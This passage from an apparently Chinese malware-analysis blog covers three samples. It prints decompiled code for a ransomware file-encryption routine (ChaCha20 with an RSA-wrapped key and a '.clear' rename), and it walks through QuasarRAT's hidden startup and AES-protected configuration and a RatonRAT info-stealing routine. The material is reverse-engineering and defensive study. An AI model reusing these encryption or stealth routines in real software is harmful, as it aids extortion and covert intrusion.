class="type">unsigned</span> <span class="type">char</span>&gt;::~__new_allocator(&amp;v34);</span><br><span class="line">    v6 = std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">data</span>(v32);</span><br><span class="line">    <span class="built_in">randombytes_buf</span>(v6, <span class="number">12</span>i64);</span><br><span class="line">    <span class="built_in">encrypt_key_rsa</span>(v31, a2, a3);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">empty</span>(v31) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v40 = &amp;v35;</span><br><span class="line">      std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">vector</span>(v30, <span class="number">0x800000</span>i64, &amp;v35);</span><br><span class="line">      std::__new_allocator&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;::~__new_allocator(&amp;v35);</span><br><span class="line">      v47 = <span class="number">0</span>i64;</span><br><span class="line">      v46 = <span class="number">0</span>i64;</span><br><span class="line">      <span class="built_in">SetFilePointer</span>(hFile, <span class="number">0</span>, <span class="number">0</span>i64, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">while</span> ( v47 &lt; QuadPart )</span><br><span class="line">      &#123;</span><br><span class="line">        v36 = QuadPart - v47;</span><br><span class="line">        v37 = <span class="number">0x800000</span>i64;</span><br><span class="line">        *(_QWORD *)nNumberOfBytesToRead = *(_QWORD *)std::<span class="built_in">min</span>&lt;<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>&gt;(&amp;v37, &amp;v36);</span><br><span class="line">        NumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">        v7 = nNumberOfBytesToRead[<span class="number">0</span>];</span><br><span class="line">        v8 = (<span class="type">void</span> *)std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">data</span>(v30);</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">ReadFile</span>(hFile, v8, v7, &amp;NumberOfBytesRead, <span class="number">0</span>i64) || !NumberOfBytesRead )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v39 = &amp;v38;</span><br><span class="line">        std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">vector</span>(v24, NumberOfBytesRead, &amp;v38);</span><br><span class="line">        std::__new_allocator&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;::~__new_allocator(&amp;v38);</span><br><span class="line">        v10 = std::array&lt;<span class="type">unsigned</span> <span class="type">char</span>,<span class="number">32ull</span>&gt;::<span class="built_in">data</span>(a2);</span><br><span class="line">        v11 = std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">data</span>(v32);</span><br><span class="line">        v12 = NumberOfBytesRead;</span><br><span class="line">        v13 = std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">data</span>(v30);</span><br><span class="line">        v14 = std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">data</span>(v24);</span><br><span class="line">        <span class="built_in">crypto_stream_chacha20_xor_ic</span>(v14, v13, v12, v11, v46, v10);</span><br><span class="line">        <span class="built_in">SetFilePointer</span>(hFile, -NumberOfBytesRead, <span class="number">0</span>i64, <span class="number">1u</span>);</span><br><span class="line">        <span class="built_in">LODWORD</span>(v10) = NumberOfBytesRead;</span><br><span class="line">        v15 = (<span class="type">const</span> <span class="type">void</span> *)std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">data</span>(v24);</span><br><span class="line">        <span class="built_in">WriteFile</span>(hFile, v15, v10, &amp;NumberOfBytesWritten, <span class="number">0</span>i64);</span><br><span class="line">        v46 += ((<span class="type">unsigned</span> __int64)NumberOfBytesRead + <span class="number">63</span>) &gt;&gt; <span class="number">6</span>;</span><br><span class="line">        v47 += NumberOfBytesRead;</span><br><span class="line">        std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;::~<span class="built_in">vector</span>(v24);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">SetFilePointer</span>(hFile, <span class="number">0</span>, <span class="number">0</span>i64, <span class="number">2u</span>);</span><br><span class="line">      v16 = std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">size</span>(v32);</span><br><span class="line">      v17 = (<span class="type">const</span> <span class="type">void</span> *)std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">data</span>(v32);</span><br><span class="line">      <span class="built_in">WriteFile</span>(hFile, v17, v16, &amp;v29, <span class="number">0</span>i64);</span><br><span class="line">      Buffer[<span class="number">0</span>] = <span class="number">1262836045</span>;</span><br><span class="line">      Buffer[<span class="number">1</span>] = std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">size</span>(v31);</span><br><span class="line">      v18 = std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">end</span>(v31);</span><br><span class="line">      v19 = std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">begin</span>(v31);</span><br><span class="line">      std::copy&lt;__gnu_cxx::__normal_iterator&lt;<span class="type">unsigned</span> <span class="type">char</span> *,std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;,<span class="type">unsigned</span> <span class="type">char</span> *&gt;(</span><br><span class="line">        v19,</span><br><span class="line">        v18,</span><br><span class="line">        &amp;v28);</span><br><span class="line">      <span class="built_in">WriteFile</span>(hFile, Buffer, <span class="number">0x108u</span>, &amp;v29, <span class="number">0</span>i64);</span><br><span class="line">      <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">      std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>&gt;(v26, a1, <span class="string">&quot;.clear&quot;</span>);</span><br><span class="line">      v20 = (<span class="type">const</span> CHAR *)std::string::<span class="built_in">c_str</span>(v26);</span><br><span class="line">      v21 = (<span class="type">const</span> CHAR *)std::string::<span class="built_in">c_str</span>(a1);</span><br><span class="line">      <span class="built_in">MoveFileExA</span>(v21, v20, <span class="number">1u</span>);</span><br><span class="line">      v4 = <span class="number">1</span>;</span><br><span class="line">      std::string::~<span class="built_in">string</span>(v26);</span><br><span class="line">      std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;::~<span class="built_in">vector</span>(v30);</span><br><span class="line">    &#125;</span><br><span class="line">    std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;::~<span class="built_in">vector</span>(v31);</span><br><span class="line">    std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;::~<span class="built_in">vector</span>(v32);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以非常明白的看见加密逻辑，所有被加密的都会加上.clear，这个是分析等我看看能不能写一个解密器</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/" rel="tag"><i class="fa fa-tag"></i> 勒索病毒</a>
+          </div>
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block cat-样本分析">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://woshinext.top/2026/04/23/QuasarRAT-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Next">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Next的小站">
+      <meta itemprop="description" content="记录样本分析、脱壳去混淆、反调试对抗等底层安全技术笔记。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Next的小站">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/04/23/QuasarRAT-2/" class="post-title-link" itemprop="url">QuasarRAT-2</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-04-23 15:56:15" itemprop="dateCreated datePublished" datetime="2026-04-23T15:56:15+08:00">2026-04-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">样本分析</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>572</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>2 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423155713827.png" alt="image-20260423155713827"></p>
+<p>来看这个木马比上个稍微难一点</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423160012069.png" alt="image-20260423160012069"></p>
+<p>可以看见这个代码中有大量的混淆先找到程序入口</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423160442461.png" alt="image-20260423160442461"></p>
+<p>可以看到有混淆的存在来分析是非常困难的于是我就去搜索有没有相关工具可以去混淆</p>
+<p>de4dot就是一个去混淆的好工具</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423161244716.png" alt="image-20260423161244716"></p>
+<p>可以看见它生成了个clean文件</p>
+<p>再打开看看</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423161437355.png" alt="image-20260423161437355"></p>
+<p>可以看见混淆清理的非常干净</p>
+<p> 查看函数GForm0()</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423161635809.png" alt="image-20260423161635809"></p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">OnLoad</span>(<span class="params">EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">base</span>.Visible = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">base</span>.ShowInTaskbar = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">this</span>.method_1();</span><br><span class="line">	<span class="keyword">base</span>.OnLoad(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中method_1()是木马的主要逻辑</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method_1</span>()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!GClass65.smethod_0())</span><br><span class="line">		&#123;</span><br><span class="line">			Environment.Exit(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">this</span>.gclass1_0 = <span class="keyword">new</span> GClass1(GClass65.string_5);</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">this</span>.gclass1_0.CreatedNew)</span><br><span class="line">		&#123;</span><br><span class="line">			Environment.Exit(<span class="number">2</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		Class19.smethod_4(Application.ExecutablePath);</span><br><span class="line">		GClass5 gclass = <span class="keyword">new</span> GClass5();</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.IsInstallationRequired)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">this</span>.gclass1_0.Dispose();</span><br><span class="line">			<span class="keyword">try</span></span><br><span class="line">			&#123;</span><br><span class="line">				gclass.method_1();</span><br><span class="line">				Environment.Exit(<span class="number">3</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span> (Exception)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">try</span></span><br><span class="line">		&#123;</span><br><span class="line">			gclass.method_0();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (Exception)</span><br><span class="line">		&#123;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!GClass65.bool_6)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">this</span>.method_0();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (GClass65.bool_3)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">this</span>.gclass46_0 = <span class="keyword">new</span> GClass46();</span><br><span class="line">			<span class="keyword">this</span>.gclass46_0.method_0();</span><br><span class="line">		&#125;</span><br><span class="line">		Class27 @class = <span class="keyword">new</span> Class27(<span class="keyword">new</span> Class26().method_0(GClass65.string_1));</span><br><span class="line">		<span class="keyword">this</span>.gclass31_0 = <span class="keyword">new</span> GClass31(@class, GClass65.x509Certificate2_0);</span><br><span class="line">		<span class="keyword">this</span>.gclass31_0.Event_1 += <span class="keyword">this</span>.gclass31_0_ClientState;</span><br><span class="line">		<span class="keyword">this</span>.method_2(<span class="keyword">this</span>.gclass31_0);</span><br><span class="line">		<span class="keyword">this</span>.gclass2_0 = <span class="keyword">new</span> GClass2(<span class="keyword">this</span>.gclass31_0);</span><br><span class="line">		<span class="keyword">this</span>.gclass2_0.method_1();</span><br><span class="line">		<span class="keyword">new</span> Thread(<span class="built_in">delegate</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">this</span>.gclass31_0.method_15();</span><br><span class="line">			Environment.Exit(<span class="number">0</span>);</span><br><span class="line">		&#125;).Start();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>GClass65是这个木马的初始化</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">GClass65</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// Token: 0x06000295 RID: 661 RVA: 0x00058284 File Offset: 0x00056484</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> <span class="title">smethod_0</span>()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrEmpty(GClass65.string_0))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		Class28 @class = <span class="keyword">new</span> Class28(GClass65.string_7);</span><br><span class="line">		GClass65.string_8 = @class.method_2(GClass65.string_8);</span><br><span class="line">		GClass65.string_0 = @class.method_2(GClass65.string_0);</span><br><span class="line">		GClass65.string_1 = @class.method_2(GClass65.string_1);</span><br><span class="line">		GClass65.string_3 = @class.method_2(GClass65.string_3);</span><br><span class="line">		GClass65.string_4 = @class.method_2(GClass65.string_4);</span><br><span class="line">		GClass65.string_5 = @class.method_2(GClass65.string_5);</span><br><span class="line">		GClass65.string_6 = @class.method_2(GClass65.string_6);</span><br><span class="line">		GClass65.string_9 = @class.method_2(GClass65.string_9);</span><br><span class="line">		GClass65.string_10 = @class.method_2(GClass65.string_10);</span><br><span class="line">		GClass65.x509Certificate2_0 = <span class="keyword">new</span> X509Certificate2(Convert.FromBase64String(@class.method_2(GClass65.string_11)));</span><br><span class="line">		GClass65.smethod_1();</span><br><span class="line">		<span class="keyword">return</span> GClass65.smethod_2();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到哪些关键数据是被method_2处理后在赋值</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">string</span> <span class="title">method_2</span>(<span class="params"><span class="built_in">string</span> input</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> Encoding.UTF8.GetString(<span class="keyword">this</span>.method_3(Convert.FromBase64String(input)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到它先base64解码后再传给method_3</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">byte</span>[] <span class="title">method_3</span>(<span class="params"><span class="built_in">byte</span>[] input</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (input == <span class="literal">null</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> ArgumentNullException(<span class="string">&quot;input can not be null.&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">byte</span>[] array6;</span><br><span class="line">	<span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream(input))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">using</span> (AesCryptoServiceProvider aesCryptoServiceProvider = <span class="keyword">new</span> AesCryptoServiceProvider())</span><br><span class="line">		&#123;</span><br><span class="line">			aesCryptoServiceProvider.KeySize = <span class="number">256</span>;</span><br><span class="line">			aesCryptoServiceProvider.BlockSize = <span class="number">128</span>;</span><br><span class="line">			aesCryptoServiceProvider.Mode = CipherMode.CBC;</span><br><span class="line">			aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;</span><br><span class="line">			aesCryptoServiceProvider.Key = <span class="keyword">this</span>.byte_0;</span><br><span class="line">			<span class="keyword">using</span> (HMACSHA256 hmacsha = <span class="keyword">new</span> HMACSHA256(<span class="keyword">this</span>.byte_1))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">byte</span>[] array = hmacsha.ComputeHash(memoryStream.ToArray(), <span class="number">32</span>, memoryStream.ToArray().Length - <span class="number">32</span>);</span><br><span class="line">				<span class="built_in">byte</span>[] array2 = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">32</span>];</span><br><span class="line">				memoryStream.Read(array2, <span class="number">0</span>, array2.Length);</span><br><span class="line">				<span class="keyword">if</span> (!Class29.smethod_0(array, array2))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> CryptographicException(<span class="string">&quot;Invalid message authentication code (MAC).&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">byte</span>[] array3 = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">16</span>];</span><br><span class="line">			memoryStream.Read(array3, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">			aesCryptoServiceProvider.IV = array3;</span><br><span class="line">			<span class="keyword">using</span> (CryptoStream cryptoStream = <span class="keyword">new</span> CryptoStream(memoryStream, aesCryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Read))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">byte</span>[] array4 = <span class="keyword">new</span> <span class="built_in">byte</span>[memoryStream.Length - <span class="number">16L</span> + <span class="number">1L</span>];</span><br><span class="line">				<span class="built_in">byte</span>[] array5 = <span class="keyword">new</span> <span class="built_in">byte</span>[cryptoStream.Read(array4, <span class="number">0</span>, array4.Length)];</span><br><span class="line">				Buffer.BlockCopy(array4, <span class="number">0</span>, array5, <span class="number">0</span>, array5.Length);</span><br><span class="line">				array6 = array5;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> array6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看见先是给256aes加密设置了一下然后验证了hash值</p>
+<pre><code>				if (!Class29.smethod_0(array, array2))
+				{
+					throw new CryptographicException(&quot;Invalid message authentication code (MAC).&quot;);
+				}
+</code></pre>
+<p>这个对比了hash值来确保木马没有被篡改，最后再aes256解密</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%9C%A8%E9%A9%AC/" rel="tag"><i class="fa fa-tag"></i> 木马</a>
+              <a href="/tags/QuasarRAT/" rel="tag"><i class="fa fa-tag"></i> QuasarRAT</a>
+          </div>
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block cat-样本分析">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://woshinext.top/2026/04/21/RatonRAT/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Next">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Next的小站">
+      <meta itemprop="description" content="记录样本分析、脱壳去混淆、反调试对抗等底层安全技术笔记。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Next的小站">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/04/21/RatonRAT/" class="post-title-link" itemprop="url">RatonRAT</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-04-21 21:54:13" itemprop="dateCreated datePublished" datetime="2026-04-21T21:54:13+08:00">2026-04-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">样本分析</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>624</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>2 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="RatonRAT"><a href="#RatonRAT" class="headerlink" title="RatonRAT"></a>RatonRAT</h1><p>今天来分析一个基本的木马</p>
+<p>了解了一下先在市面上的木马一般都是用c#写的所以用dnSpy分析</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260421215826092.png" alt="image-20260421215826092"></p>
+<p>首先要找到木马逻辑</p>
+<p>在这个目录上可以看见系统文件和dnSpy的信息文件而主要逻辑是在client中</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260421215956793.png" alt="image-20260421215956793"></p>
+<p>展开client可以看见</p>
+<p>其中Client.Raton是这个木马的主要逻辑</p>
+<p>costura是用来将dll整合成exe文件</p>
+<p>至于cilent.praperties是系统自动生成的不用理会</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260421220953053.png" alt="image-20260421220953053"></p>
+<p>在supervisor下有这这个木马的关键函数</p>
+<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Task <span class="title">InfoStuff</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Supervisor.&lt;InfoStuff&gt;d__21 &lt;InfoStuff&gt;d__;</span><br><span class="line">	&lt;InfoStuff&gt;d__.&lt;&gt;t__builder = AsyncTaskMethodBuilder.<span class="built_in">Create</span>();</span><br><span class="line">	&lt;InfoStuff&gt;d__.&lt;&gt;<span class="number">4</span>__this = <span class="keyword">this</span>;</span><br><span class="line">	&lt;InfoStuff&gt;d__.&lt;&gt;<span class="number">1</span>__state = <span class="number">-1</span>;</span><br><span class="line">	&lt;InfoStuff&gt;d__.&lt;&gt;t__builder.Start&lt;Supervisor.&lt;InfoStuff&gt;d__21&gt;(ref &lt;InfoStuff&gt;d__);</span><br><span class="line">	<span class="keyword">return</span> &lt;InfoStuff&gt;d__.&lt;&gt;t__builder.Task;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个函数调用了异步函数使木马可以在后台运行来窃取电脑信息</p>
